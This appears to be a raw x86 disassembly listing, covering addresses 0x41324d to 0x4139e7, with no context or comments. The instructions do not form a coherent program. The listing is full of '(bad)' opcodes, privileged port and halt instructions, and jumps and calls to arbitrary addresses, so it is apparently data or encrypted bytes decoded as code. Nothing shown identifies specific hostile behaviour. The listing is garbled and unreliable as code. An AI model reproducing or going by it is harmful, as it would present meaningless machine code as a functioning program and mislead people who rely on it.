  41324d:	lods   al,BYTE PTR ds:[esi]
  41324e:	pop    eax
  41324f:	push   ebx
  413250:	retf   0xbbea
  413253:	cmp    ch,dl
  413255:	xchg   esi,eax
  413256:	or     cl,cl
  413258:	mov    eax,ds:0x2cee8882
  41325d:	dec    edi
  41325e:	shl    BYTE PTR [edx+ebx*2+0x65e8854d],1
  413265:	dec    ebx
  413266:	jb     0x41324f
  413268:	aad    0xde
  41326a:	add    DWORD PTR [edx+0x5f],ecx
  41326d:	sbb    al,0x6a
  41326f:	aam    0x8
  413271:	test   al,0x43
  413273:	test   al,0x41
  413275:	mov    ch,0x45
  413277:	add    DWORD PTR [edi+0x145cc839],edi
  41327d:	or     eax,0x27604701
  413282:	hlt    
  413283:	mov    bl,0xa7
  413285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413286:	in     al,0x66
  413288:	out    dx,eax
  413289:	daa    
  41328a:	not    DWORD PTR [edi+0x45ffed5e]
  413290:	jns    0x413249
  413292:	dec    esi
  413293:	adc    eax,0x63bc0c9a
  413298:	mov    ch,0x67
  41329a:	shl    DWORD PTR [ebx+ecx*8-0x1a],cl
  41329e:	xchg   esp,eax
  41329f:	sbb    al,0xc8
  4132a1:	pop    ebx
  4132a2:	stc    
  4132a3:	retf   0xd68f
  4132a6:	bound  ecx,QWORD PTR [edi]
  4132a8:	imul   edi,ecx,0x36
  4132ab:	add    ecx,edi
  4132ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132ae:	clc    
  4132af:	sub    BYTE PTR [esi-0x6d],bh
  4132b2:	ja     0x4132de
  4132b4:	fdivr  QWORD PTR [esi+0xf3b6f1a]
  4132ba:	and    edi,DWORD PTR [edx+0x76]
  4132bd:	mov    WORD PTR [edx],cs
  4132bf:	sbb    DWORD PTR [ebx+0x1],ebp
  4132c2:	cdq    
  4132c3:	xchg   edi,eax
  4132c4:	jb     0x4132f5
  4132c6:	jl     0x413291
  4132c8:	adc    ah,cl
  4132ca:	adc    DWORD PTR [ecx-0x6f5098d1],edx
  4132d0:	pop    ss
  4132d1:	and    al,0xaf
  4132d3:	push   eax
  4132d4:	push   0xfffffffb
  4132d6:	test   BYTE PTR [ecx],dl
  4132d8:	std    
  4132d9:	lock sub eax,0x6f5a63de
  4132df:	pop    ebp
  4132e0:	or     eax,0xb7240959
  4132e5:	sub    esp,esi
  4132e7:	push   ebp
  4132e8:	ds xchg esp,eax
  4132ea:	fld    DWORD PTR [edx+0x23d6e2e0]
  4132f0:	pop    ax
  4132f2:	mov    ebp,0x99c2d9e5
  4132f7:	jb     0x4132a2
  4132f9:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4132fb:	ds push edi
  4132fd:	mov    edi,0x448740c6
  413302:	jmp    0x8a4cde53
  413307:	cmp    DWORD PTR [eax+0x1a1bf3f4],edi
  41330d:	test   DWORD PTR [ebx],ecx
  41330f:	rol    DWORD PTR [edx],1
  413311:	dec    ebp
  413312:	jge    0x413377
  413314:	std    
  413315:	nop
  413316:	mov    ch,0xbe
  413318:	xchg   ebp,eax
  413319:	xchg   DWORD PTR [ebp+0x17c8b18e],ebp
  41331f:	mov    ds:0x402d5310,al
  413324:	mov    eax,0x5d9e3475
  413329:	test   DWORD PTR [edx],eax
  41332b:	xlat   BYTE PTR ds:[ebx]
  41332c:	push   ecx
  41332d:	mov    esi,0x94b12da1
  413332:	fisubr WORD PTR [edi]
  413334:	pop    eax
  413335:	rcl    edx,1
  413337:	dec    edi
  413338:	xchg   DWORD PTR [eax+0x2d],edx
  41333b:	jo     0x41332a
  41333d:	push   esp
  41333e:	(bad)  
  41333f:	aaa    
  413340:	rcr    edx,0xbc
  413343:	pop    esi
  413344:	push   ss
  413345:	pop    eax
  413346:	out    0xbe,al
  413348:	sbb    BYTE PTR [edx-0x7e79f74e],bh
  41334e:	or     DWORD PTR [edi-0x5e],ebp
  413351:	or     BYTE PTR [edi+0x2],0xd7
  413355:	popa   
  413356:	and    DWORD PTR [esi],ebp
  413358:	stc    
  413359:	inc    edx
  41335a:	pop    edx
  41335b:	push   0x41
  41335d:	xchg   ecx,eax
  41335e:	into   
  41335f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413360:	(bad)  
  413361:	fistp  DWORD PTR [esi+0x25]
  413364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413365:	fidivr WORD PTR [ebp+0x33]
  413368:	lods   al,BYTE PTR ds:[esi]
  413369:	jecxz  0x41338e
  41336b:	push   edi
  41336c:	jecxz  0x41336e
  41336e:	and    edi,DWORD PTR [ecx+0x2992bfa6]
  413374:	or     cl,BYTE PTR [ebx+0x15]
  413377:	cwde   
  413378:	leave  
  413379:	push   eax
  41337a:	ins    BYTE PTR es:[edi],dx
  41337b:	int3   
  41337c:	sub    al,0x47
  41337e:	adc    edi,DWORD PTR [edx-0xa0cbf4c]
  413384:	inc    ebx
  413385:	out    dx,eax
  413386:	dec    edi
  413387:	in     al,dx
  413388:	push   ss
  413389:	jmp    0x36485e9e
  41338e:	inc    ecx
  41338f:	sbb    eax,0x3cc4fe3a
  413394:	aam    0xe6
  413396:	in     al,dx
  413397:	shl    BYTE PTR [eax-0x1feb51d4],cl
  41339d:	mov    bl,BYTE PTR [ebx]
  41339f:	fld    DWORD PTR [eax]
  4133a1:	sbb    bl,dl
  4133a3:	jl     0x413391
  4133a5:	call   0x8bb25816
  4133aa:	and    esi,ebx
  4133ac:	cmc    
  4133ad:	(bad)  
  4133ae:	adc    al,0xde
  4133b0:	sub    DWORD PTR [ebx-0x75],esi
  4133b3:	popa   
  4133b4:	xor    BYTE PTR [edx-0x23],0xff
  4133b8:	mov    esp,0x5ad2faff
  4133bd:	xor    ebp,DWORD PTR [eax+ebp*8]
  4133c0:	or     ah,BYTE PTR [edi]
  4133c2:	pop    edi
  4133c3:	int    0x66
  4133c5:	mov    BYTE PTR [edx+0x55a08ef1],dh
  4133cb:	nop
  4133cc:	ret    0xe548
  4133cf:	dec    ecx
  4133d0:	push   ecx
  4133d1:	inc    edx
  4133d2:	icebp  
  4133d3:	jns    0x4133cf
  4133d5:	pop    esi
  4133d6:	mov    ebx,0xf803b0f4
  4133db:	jae    0xc385563c
  4133e1:	pushf  
  4133e2:	pusha  
  4133e3:	jecxz  0x4133c5
  4133e5:	mov    ebx,0xbcff1bdb
  4133ea:	inc    ebp
  4133eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133ec:	pushf  
  4133ed:	add    BYTE PTR [edx+0x3a],bl
  4133f0:	fimul  DWORD PTR ss:[edx+eiz*4+0x40]
  4133f5:	cmp    esp,DWORD PTR [edi+0x46]
  4133f8:	inc    esi
  4133f9:	dec    esi
  4133fa:	mov    esp,gs
  4133fc:	cs ins DWORD PTR es:[edi],dx
  4133fe:	ror    esp,cl
  413400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413401:	xlat   BYTE PTR ds:[ebx]
  413402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413403:	adc    al,0x56
  413405:	mov    eax,0x32ee027e
  41340a:	cmp    al,0xd4
  41340c:	xor    ebp,DWORD PTR [ebp+esi*2-0x6c]
  413410:	fsubp  st(4),st
  413412:	loope  0x41343a
  413414:	cwde   
  413415:	jecxz  0x413418
  413417:	vpsubw ymm0{k3},ymm5,ymm4
  41341d:	xlat   BYTE PTR ds:[ebx]
  41341e:	repz jnp 0x4133ed
  413421:	fcomp  QWORD PTR [esi]
  413423:	loopne 0x4133da
  413425:	fldz   
  413427:	call   0xb43b992e
  41342c:	mov    WORD PTR [eax+0x40ec2474],fs
  413432:	jmp    0x65e75d72
  413437:	jbe    0x4133e1
  413439:	dec    ebx
  41343a:	sti    
  41343b:	(bad)  
  41343c:	outs   dx,DWORD PTR ds:[esi]
  41343d:	sub    ecx,DWORD PTR [ecx]
  41343f:	sub    al,0xfc
  413441:	add    dh,BYTE PTR [esp+edi*1-0xe61a7a7]
  413448:	ins    BYTE PTR es:[edi],dx
  413449:	mov    bh,0x5f
  41344b:	test   al,0x82
  41344d:	iret   
  41344e:	ret    
  41344f:	into   
  413450:	retf   0xee06
  413453:	push   cs
  413454:	jl     0x413422
  413456:	je     0x41343a
  413458:	dec    esp
  413459:	mov    esp,0xf1632053
  41345e:	jae    0x413471
  413460:	inc    esp
  413461:	iret   
  413462:	push   ds
  413463:	ins    DWORD PTR es:[edi],dx
  413464:	or     cl,bh
  413466:	popa   
  413467:	iret   
  413468:	jecxz  0x413400
  41346a:	into   
  41346b:	jl     0x4134e8
  41346d:	(bad)  
  41346e:	iret   
  41346f:	push   ss
  413470:	idiv   esi
  413472:	popa   
  413473:	shl    eax,0xd5
  413476:	mov    cl,0x3f
  413478:	xchg   DWORD PTR [eax],edx
  41347a:	xor    BYTE PTR [ebx+eax*1],bl
  41347d:	push   edi
  41347e:	xchg   ecx,ecx
  413480:	dec    ecx
  413481:	dec    ebx
  413482:	dec    edx
  413483:	cld    
  413484:	fucom  st(1)
  413486:	mov    eax,0xbee2fb19
  41348b:	js     0x4134bb
  41348d:	imul   esi,DWORD PTR [eax+ecx*1],0xfffffff3
  413491:	mov    ecx,0x3ccc330c
  413496:	or     DWORD PTR [edx+0x2e5fcbe8],0x4788343e
  4134a0:	jmp    0x6752:0xb70c0962
  4134a7:	ret    0x5806
  4134aa:	cmp    bh,0x42
  4134ad:	jmp    0xed68:0xa997c687
  4134b4:	push   ebx
  4134b5:	enter  0x5bb9,0xd2
  4134b9:	sahf   
  4134ba:	xor    eax,0xb73ad9bf
  4134bf:	push   edi
  4134c0:	mov    ebx,0x85e25f74
  4134c5:	push   cs
  4134c6:	call   0x2b0f:0x6d03711
  4134cd:	or     ebx,DWORD PTR [ebx-0x63]
  4134d0:	jb     0x4134da
  4134d2:	imul   DWORD PTR [ebx]
  4134d4:	ds mov ch,0x3
  4134d7:	scas   eax,DWORD PTR es:[edi]
  4134d8:	jle    0x41346b
  4134da:	sbb    al,0x34
  4134dc:	xchg   edi,eax
  4134dd:	jl     0x413538
  4134df:	fmulp  st(1),st
  4134e1:	fs inc edi
  4134e3:	enter  0xceac,0x42
  4134e7:	std    
  4134e8:	pushf  
  4134e9:	aas    
  4134ea:	sbb    bh,BYTE PTR [ebx-0x45]
  4134ed:	dec    ebx
  4134ee:	and    al,0xb6
  4134f0:	dec    ecx
  4134f1:	push   ebx
  4134f2:	inc    ebp
  4134f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134f4:	imul   edx,DWORD PTR [eax+0x3e],0x7c
  4134f8:	stos   BYTE PTR es:[edi],al
  4134f9:	push   edi
  4134fa:	out    0x4e,al
  4134fc:	cmp    al,ah
  4134fe:	mov    eax,ds:0xdd63109e
  413503:	dec    ebx
  413504:	into   
  413505:	or     al,0xb8
  413507:	lea    ecx,[ebx]
  413509:	jo     0x413565
  41350b:	(bad)  
  41350c:	hlt    
  41350d:	adc    ah,ah
  41350f:	(bad)  
  413510:	xchg   bl,bh
  413512:	cwde   
  413513:	dec    ebp
  413514:	jae    0x413531
  413516:	ins    BYTE PTR es:[edi],dx
  413517:	pusha  
  413518:	sbb    al,0xd4
  41351a:	mov    WORD PTR [ebp-0x349b2147],ss
  413520:	cmc    
  413521:	idiv   ch
  413523:	retf   0x1dff
  413526:	loope  0x4135a1
  413528:	in     eax,0x64
  41352a:	fisttp WORD PTR [esi+ecx*1+0x20]
  41352e:	stos   DWORD PTR es:[edi],eax
  41352f:	jb     0x413521
  413531:	dec    ecx
  413532:	rcr    cl,cl
  413534:	mov    esi,0x7bf069ce
  413539:	int3   
  41353a:	dec    edx
  41353b:	test   al,0x13
  41353d:	cmc    
  41353e:	cmp    DWORD PTR [ebp+0x73],ebx
  413541:	mov    cl,0xbc
  413543:	adc    eax,ebx
  413545:	imul   eax,DWORD PTR [ecx+0x1850c230],0x9c3d0a41
  41354f:	imul   ecx,DWORD PTR [eax-0x1f],0xffffff80
  413553:	aad    0xd0
  413555:	cmp    DWORD PTR [ebp+0x5f48b35b],edx
  41355b:	and    al,BYTE PTR [esi-0x71]
  41355e:	loope  0x4135ac
  413560:	cld    
  413561:	push   eax
  413562:	mov    WORD PTR [eax-0x2b],cs
  413565:	enter  0x7234,0x66
  413569:	sub    esp,0x24e25cf1
  41356f:	cmp    eax,0x4036c8fc
  413574:	sbb    BYTE PTR [edi-0x7646d950],dh
  41357a:	or     bl,BYTE PTR [edx]
  41357c:	xor    BYTE PTR [esi-0x47f3b19e],ch
  413582:	or     al,BYTE PTR [eax+edx*4-0x346151c1]
  413589:	adc    DWORD PTR [edi+0x153ff0ed],0x28ee9a58
  413593:	loop   0x41358d
  413595:	mov    eax,ds:0x1fc5cb40
  41359a:	push   es
  41359b:	(bad)  
  41359c:	aad    0x41
  41359e:	sbb    DWORD PTR cs:[esi-0xd],edi
  4135a2:	ins    BYTE PTR es:[edi],dx
  4135a3:	xor    eax,0x325b25c0
  4135a8:	jbe    0x6734a63a
  4135ae:	add    DWORD PTR [ebx+eiz*4-0x469d6254],0xffffffcc
  4135b6:	dec    eax
  4135b7:	pop    esp
  4135b8:	sub    ecx,DWORD PTR [ecx+0xfa9dbda]
  4135be:	sbb    al,0x83
  4135c0:	add    ebx,DWORD PTR [edi+0x514dd79d]
  4135c6:	icebp  
  4135c7:	bound  eax,QWORD PTR [edx-0x6b5aa893]
  4135cd:	rol    edi,cl
  4135cf:	inc    esp
  4135d0:	mov    dl,0xe6
  4135d2:	das    
  4135d3:	or     BYTE PTR [ecx+esi*8],al
  4135d6:	jnp    0x4135f2
  4135d8:	dec    edx
  4135d9:	pop    ebp
  4135da:	icebp  
  4135db:	rol    BYTE PTR [edx-0x28],cl
  4135de:	leave  
  4135df:	mov    ebp,esp
  4135e1:	ins    DWORD PTR es:[edi],dx
  4135e2:	cmp    BYTE PTR [esi],al
  4135e4:	dec    edi
  4135e5:	xor    DWORD PTR [ecx-0x2dab04c6],esi
  4135eb:	dec    esp
  4135ec:	mov    ebx,0x9afc7f7c
  4135f1:	les    edi,FWORD PTR [ebp+esi*2+0x71a06ee7]
  4135f8:	(bad)  [edx-0x6cbef3b2]
  4135fe:	jmp    0x413596
  413600:	sahf   
  413601:	pop    esp
  413602:	xor    ebx,DWORD PTR [edx+ebp*4+0xc]
  413606:	cdq    
  413607:	inc    eax
  413608:	popa   
  413609:	popa   
  41360a:	std    
  41360b:	push   0x69
  41360d:	sbb    al,0x1f
  41360f:	lahf   
  413610:	jg     0x413604
  413612:	sbb    esp,DWORD PTR ds:0x76b07e66
  413618:	xor    DWORD PTR ds:0x67c20bb,esi
  41361e:	pop    eax
  41361f:	pop    ss
  413620:	push   ds
  413621:	mov    esp,0x34f0f5a7
  413626:	fcom   QWORD PTR [eax]
  413628:	mov    ds:0x3693b5a5,al
  41362d:	imul   ebp,DWORD PTR [ebx+0x67],0x1
  413631:	retf   0x3d36
  413634:	sub    eax,DWORD PTR [eax-0x1a]
  413637:	div    DWORD PTR [edx+ecx*8]
  41363a:	call   0x330587a6
  41363f:	pusha  
  413640:	push   es
  413641:	jmp    0xce03097f
  413646:	mov    bh,0x4e
  413648:	cmp    BYTE PTR [esp+ecx*8-0x31],0x9a
  41364d:	pusha  
  41364e:	leave  
  41364f:	add    eax,0xd5cac4ca
  413654:	rep ins DWORD PTR es:[edi],dx
  413656:	pop    ds
  413657:	(bad)  
  413659:	test   BYTE PTR [ebx-0x12],ah
  41365c:	fwait
  41365d:	adc    edi,0x8cf9bb6b
  413663:	bound  ecx,QWORD PTR [eax-0x42524c6d]
  413669:	hlt    
  41366a:	retf   
  41366b:	mov    ch,0x4b
  41366d:	xchg   ecx,eax
  41366e:	loope  0x413652
  413670:	test   eax,0x21a94396
  413675:	shl    BYTE PTR [edx-0x24a5f6b2],cl
  41367b:	sbb    DWORD PTR [ebx],0x4e9dea59
  413681:	outs   dx,DWORD PTR ds:[esi]
  413682:	mov    edi,0xbd712008
  413687:	cmp    eax,0x4be4ba91
  41368c:	repz adc BYTE PTR [eax-0x77],ah
  413690:	imul   ebx,eax,0xffffffbd
  413693:	cmp    ecx,DWORD PTR [ebx]
  413695:	rcr    esi,cl
  413697:	jge    0x413680
  413699:	xchg   edx,eax
  41369a:	aad    0x90
  41369c:	es std 
  41369e:	stos   BYTE PTR es:[edi],al
  41369f:	mov    ebx,DWORD PTR [esi+0x2e]
  4136a2:	adc    cl,BYTE PTR ds:0xeae421bd
  4136a8:	sub    eax,0xb3b7e979
  4136ad:	scas   al,BYTE PTR es:[edi]
  4136ae:	bound  ebx,QWORD PTR [edi]
  4136b0:	or     BYTE PTR [edx-0x27],cl
  4136b3:	adc    esp,0x75
  4136b6:	dec    ebx
  4136b7:	mov    dl,al
  4136b9:	loop   0x4136f9
  4136bb:	fdivr  st,st(4)
  4136bd:	loope  0x4136b3
  4136bf:	mov    DWORD PTR [esp+ecx*8],ebx
  4136c2:	call   0xd36d5178
  4136c7:	cwde   
  4136c8:	dec    ebx
  4136c9:	add    bl,bh
  4136cb:	in     al,dx
  4136cc:	pop    esp
  4136cd:	sar    DWORD PTR [ebp-0x30],1
  4136d0:	punpcklwd mm6,DWORD PTR [edx]
  4136d3:	push   edx
  4136d4:	in     al,0x69
  4136d6:	or     ecx,esp
  4136d8:	js     0x41371c
  4136da:	gs icebp 
  4136dc:	push   edi
  4136dd:	data16 fwait
  4136df:	scas   eax,DWORD PTR es:[edi]
  4136e0:	mov    BYTE PTR [edx],bh
  4136e2:	mul    BYTE PTR [ebx]
  4136e4:	mov    esi,0x84fc8a7c
  4136e9:	cmp    cl,bl
  4136eb:	xchg   ecx,eax
  4136ec:	sbb    al,0x37
  4136ee:	clc    
  4136ef:	xor    BYTE PTR [edx-0x30],cl
  4136f2:	out    0x79,eax
  4136f4:	inc    edx
  4136f5:	add    ecx,edi
  4136f7:	out    dx,al
  4136f8:	out    0xd7,al
  4136fa:	or     BYTE PTR [ebx+ecx*4-0x6b],bl
  4136fe:	jbe    0x41369f
  413700:	(bad)  
  413701:	das    
  413702:	push   eax
  413703:	(bad)  
  413705:	push   0x1732706f
  41370a:	call   0xc33f:0x160d7c0b
  413711:	test   DWORD PTR [ecx+0x48],esi
  413714:	push   edi
  413715:	xchg   ebx,eax
  413716:	xlat   BYTE PTR ds:[ebx]
  413717:	fadd   QWORD PTR [edi-0x63]
  41371a:	inc    eax
  41371b:	cmp    eax,0x4948485c
  413720:	lahf   
  413721:	in     al,dx
  413722:	add    edx,eax
  413724:	or     BYTE PTR [eax],0xc1
  413727:	cld    
  413728:	mov    esi,0xdd1fdafb
  41372d:	xor    BYTE PTR [eax+0x367e7193],cl
  413733:	xchg   esp,eax
  413734:	sub    al,0xf0
  413736:	pop    eax
  413737:	sub    al,0xbc
  413739:	imul   ebp,DWORD PTR [edi],0x2d
  41373c:	push   es
  41373d:	mov    edx,0xc0b5e22c
  413742:	sbb    DWORD PTR [edi+0x58],ecx
  413745:	jmp    0x413780
  413747:	xor    BYTE PTR [ebx],ch
  413749:	ins    DWORD PTR es:[edi],dx
  41374a:	dec    ecx
  41374b:	cmp    eax,0x65f8ae8
  413750:	sti    
  413751:	shl    BYTE PTR [ecx-0x2653a353],1
  413757:	test   eax,0xa888cea9
  41375c:	sbb    ebx,eax
  41375e:	jno    0x413767
  413760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413761:	inc    eax
  413762:	in     al,dx
  413763:	pushf  
  413764:	push   0xffffffc4
  413766:	imul   ecx,ebp,0x4b
  413769:	les    edi,FWORD PTR [ebp+0x6816337d]
  41376f:	xchg   DWORD PTR [edx],edx
  413771:	push   eax
  413772:	sub    bl,BYTE PTR [esi+0x32]
  413775:	jbe    0x4137d7
  413777:	retf   
  413778:	cmp    DWORD PTR [edi],ecx
  41377a:	add    ebx,DWORD PTR [ecx+0x73c08fb3]
  413780:	mov    ecx,0x24edac5e
  413785:	jbe    0x4137c8
  413787:	cwde   
  413788:	std    
  413789:	push   esi
  41378a:	stc    
  41378b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41378c:	(bad)  [ebp+0x16e7fdeb]
  413792:	shr    DWORD PTR [edi+0x5d],1
  413795:	jae    0x41379f
  413797:	push   edi
  413798:	mov    bl,BYTE PTR [ebx+0x7f]
  41379b:	aam    0xcb
  41379d:	pop    esi
  41379e:	inc    esp
  41379f:	jle    0x41377f
  4137a1:	mov    ch,0xd8
  4137a3:	inc    eax
  4137a4:	adc    ecx,DWORD PTR [eax-0x31]
  4137a7:	jae    0x41376e
  4137a9:	in     al,dx
  4137aa:	jo     0x41373b
  4137ac:	test   DWORD PTR [ebp+0x4cd954b6],ebx
  4137b2:	pop    ecx
  4137b3:	sahf   
  4137b4:	pop    ds
  4137b5:	jle    0x41382a
  4137b7:	stos   DWORD PTR es:[edi],eax
  4137b8:	dec    esi
  4137b9:	stc    
  4137ba:	sub    al,0xe2
  4137bc:	ret    0xb80b
  4137bf:	in     al,dx
  4137c0:	xchg   ebp,eax
  4137c1:	and    ebp,DWORD PTR [eax+0x4e]
  4137c4:	out    dx,eax
  4137c5:	sub    DWORD PTR [ebp+eax*2+0x61],ebx
  4137c9:	aad    0xb1
  4137cb:	xchg   ebp,eax
  4137cc:	cmp    eax,0x1b38315b
  4137d1:	and    DWORD PTR [eax],ecx
  4137d3:	retf   
  4137d4:	(bad)  
  4137d5:	outs   dx,DWORD PTR ds:[esi]
  4137d6:	dec    esp
  4137d7:	dec    edi
  4137d8:	les    edx,FWORD PTR [ebx]
  4137da:	sbb    eax,0x291c54ad
  4137df:	sub    ebx,eax
  4137e1:	sub    al,0xf
  4137e3:	pop    ds
  4137e4:	inc    esi
  4137e5:	push   ebp
  4137e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137e7:	jbe    0x41377f
  4137e9:	mov    cl,0xe6
  4137eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ec:	aad    0xa9
  4137ee:	jno    0x4137fc
  4137f0:	ret    
  4137f1:	pop    edi
  4137f2:	and    BYTE PTR [ecx+0x136f03f0],dh
  4137f8:	test   cl,cl
  4137fa:	adc    cl,dl
  4137fc:	mov    eax,ds:0x3c608d9c
  413801:	gs xchg ecx,eax
  413803:	dec    esi
  413804:	or     bl,BYTE PTR [edi+0x68244d4d]
  41380a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41380b:	push   edx
  41380c:	sbb    edi,DWORD PTR [esi+0x6b5c0ea2]
  413812:	neg    BYTE PTR [eax+eax*4]
  413815:	xor    eax,0x1c40bbaf
  41381a:	scas   eax,DWORD PTR es:[edi]
  41381b:	je     0x4137a4
  41381d:	jae    0x413810
  41381f:	sbb    eax,DWORD PTR [ecx]
  413821:	push   ss
  413822:	xor    BYTE PTR [ecx-0x6b729f22],bl
  413828:	aaa    
  413829:	nop
  41382a:	mov    ah,dh
  41382c:	dec    eax
  41382d:	out    dx,al
  41382e:	bound  edi,QWORD PTR [ebp+0x48d7955d]
  413834:	idiv   BYTE PTR [esi*1+0x63a11108]
  41383b:	push   0xffffff90
  41383d:	lods   al,BYTE PTR ds:[esi]
  41383e:	xor    al,0x6b
  413840:	push   ecx
  413841:	jns    0x413867
  413843:	jne    0x413883
  413845:	dec    esi
  413846:	daa    
  413847:	(bad)  
  413848:	mov    al,ds:0x818af19a
  41384d:	in     al,0x81
  41384f:	add    eax,DWORD PTR [ebx]
  413851:	xor    eax,0x47dbffb4
  413856:	mul    DWORD PTR [esi]
  413858:	mov    ecx,DWORD PTR [eax-0x69]
  41385b:	sub    bh,bl
  41385d:	es jg  0x413876
  413860:	xor    bh,BYTE PTR [ebx-0x17f09023]
  413866:	rcl    DWORD PTR [edi-0x6a414d7b],0x9f
  41386d:	clc    
  41386e:	lods   al,BYTE PTR ds:[esi]
  41386f:	test   BYTE PTR [ebx],bl
  413871:	mov    cs,WORD PTR [edx]
  413873:	retf   
  413874:	lods   eax,DWORD PTR ds:[esi]
  413875:	lods   al,BYTE PTR ds:[esi]
  413876:	sub    BYTE PTR [eax-0x2d],bh
  413879:	mov    ebx,0x5210285
  41387e:	push   edi
  41387f:	jnp    0x41388b
  413881:	out    dx,al
  413882:	adc    eax,0xe877c45a
  413887:	push   es
  413888:	mov    bl,0x5c
  41388a:	sti    
  41388b:	push   0x7de699ab
  413890:	pop    eax
  413891:	jb     0x41384c
  413893:	scas   eax,DWORD PTR es:[edi]
  413894:	sbb    ebx,esi
  413896:	test   al,0xf4
  413898:	cwde   
  413899:	in     eax,dx
  41389a:	(bad)  
  41389b:	call   0xbc1976cc
  4138a0:	and    dh,al
  4138a2:	push   ebp
  4138a3:	cmp    DWORD PTR [edx+0x5f],esi
  4138a6:	jo     0x413880
  4138a8:	fcom   DWORD PTR [ebx+0x695182a3]
  4138ae:	xchg   esi,eax
  4138af:	mov    bh,0xea
  4138b1:	and    al,0xfe
  4138b3:	lods   al,BYTE PTR ds:[esi]
  4138b4:	or     DWORD PTR [ecx],ebx
  4138b6:	test   edx,0x7e59168f
  4138bc:	leave  
  4138bd:	inc    edx
  4138be:	xlat   BYTE PTR ds:[ebx]
  4138bf:	jns    0x4138d3
  4138c1:	or     BYTE PTR [edx+ecx*1-0x6598a3d8],0xca
  4138c9:	shr    dh,1
  4138cb:	xchg   edi,eax
  4138cc:	xor    eax,0xd25b3e48
  4138d1:	mov    dh,0xfb
  4138d3:	jbe    0x4138f0
  4138d5:	jbe    0x413872
  4138d7:	nop
  4138d8:	dec    edi
  4138d9:	fistp  WORD PTR ds:0xfca57b36
  4138df:	mov    BYTE PTR [ebx+0x64e1d2f],ah
  4138e5:	and    eax,0x92e62dd
  4138ea:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4138ec:	enter  0x4315,0xfc
  4138f0:	into   
  4138f1:	in     al,dx
  4138f2:	push   eax
  4138f3:	cwde   
  4138f4:	cs ret 0x630d
  4138f8:	mov    cl,0xa5
  4138fa:	xor    dh,bh
  4138fc:	xor    al,0x80
  4138fe:	aaa    
  4138ff:	scas   al,BYTE PTR es:[edi]
  413900:	pop    eax
  413901:	sub    BYTE PTR [ecx+0x6d1d550d],bl
  413907:	mov    ch,dh
  413909:	cmp    ah,BYTE PTR [eax+ebp*1]
  41390c:	jbe    0x413931
  41390e:	mov    BYTE PTR [edx-0x2aedbb23],dh
  413914:	pusha  
  413915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413916:	loop   0x41392e
  413918:	sub    DWORD PTR [esi+ebx*8],eax
  41391b:	hlt    
  41391c:	pop    edi
  41391d:	out    dx,al
  41391e:	pusha  
  41391f:	push   ebx
  413920:	pop    ebp
  413921:	sbb    eax,0x7fba210
  413926:	ret    0x71d0
  413929:	(bad)  
  41392a:	rcr    esi,1
  41392c:	push   ebp
  41392d:	in     eax,dx
  41392e:	ror    DWORD PTR [ebx+eax*2],0x38
  413932:	sahf   
  413933:	cmc    
  413934:	stc    
  413935:	fwait
  413936:	sub    BYTE PTR [edi+0x65cd0085],0x48
  41393d:	push   cs
  41393e:	popa   
  41393f:	mov    eax,0xa47acf
  413944:	sbb    DWORD PTR [ecx-0x15],0x71e344cb
  41394b:	fimul  DWORD PTR [esp+ecx*2+0x56]
  41394f:	mul    DWORD PTR [ebx]
  413951:	xchg   ecx,eax
  413952:	push   ecx
  413953:	and    al,0x8a
  413955:	pop    edi
  413956:	shl    cl,1
  413958:	lock imul ebx,ebp,0x69
  41395c:	add    esi,DWORD PTR [eax]
  41395e:	inc    edi
  41395f:	enter  0x2a0b,0x1c
  413963:	pop    esi
  413964:	not    BYTE PTR [ebx-0x1a]
  413967:	or     al,0xa8
  413969:	adc    DWORD PTR [esp+ecx*8-0x33],esi
  41396d:	jnp    0x4139c8
  41396f:	test   eax,0x25edb8b9
  413974:	nop
  413975:	das    
  413976:	(bad)  
  413977:	sti    
  413978:	shl    DWORD PTR [edi-0x38],1
  41397b:	inc    ebp
  41397c:	xor    ebx,DWORD PTR [esp+ebx*4+0x70]
  413980:	add    ah,BYTE PTR [esi+0x6864ed4]
  413986:	sub    ebp,DWORD PTR [ebx-0xc21d53e]
  41398c:	cmp    esp,eax
  41398e:	mov    cl,0x87
  413990:	xchg   edi,eax
  413991:	sub    bl,BYTE PTR [eax-0x48]
  413994:	enter  0xfa1,0x1f
  413998:	pusha  
  413999:	(bad)  
  41399a:	jge    0x41391e
  41399c:	inc    esi
  41399d:	cmc    
  41399e:	dec    BYTE PTR [ecx+eax*1+0x3b]
  4139a2:	inc    edx
  4139a3:	cs ins BYTE PTR es:[edi],dx
  4139a5:	loopne 0x413964
  4139a7:	adc    BYTE PTR [edi+0x14cedc14],dh
  4139ad:	pop    edi
  4139ae:	and    esp,esp
  4139b0:	sub    BYTE PTR [ecx-0x66],0xae
  4139b4:	jns    0x4139e2
  4139b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139b7:	scas   eax,DWORD PTR es:[edi]
  4139b8:	mov    DWORD PTR [ebp+0x4b],eax
  4139bb:	(bad)  
  4139bc:	mov    eax,DWORD PTR [eax+ebx*8-0x20]
  4139c0:	xchg   BYTE PTR [ecx],al
  4139c2:	xchg   edi,eax
  4139c3:	sbb    edi,DWORD PTR [edx*4-0xf28b6a6]
  4139ca:	in     eax,0xbf
  4139cc:	in     al,0x3c
  4139ce:	and    dl,bh
  4139d0:	adc    eax,0x79e2f820
  4139d5:	xchg   dl,bl
  4139d7:	and    BYTE PTR [esi],0xd5
  4139da:	es ss jmp 0x36d466b0
  4139e1:	sub    al,0x7d
  4139e3:	out    dx,al
  4139e4:	lds    ecx,FWORD PTR [ebp-0x32]
  4139e7:	outs   dx,DWORD PTR ds:[esi]
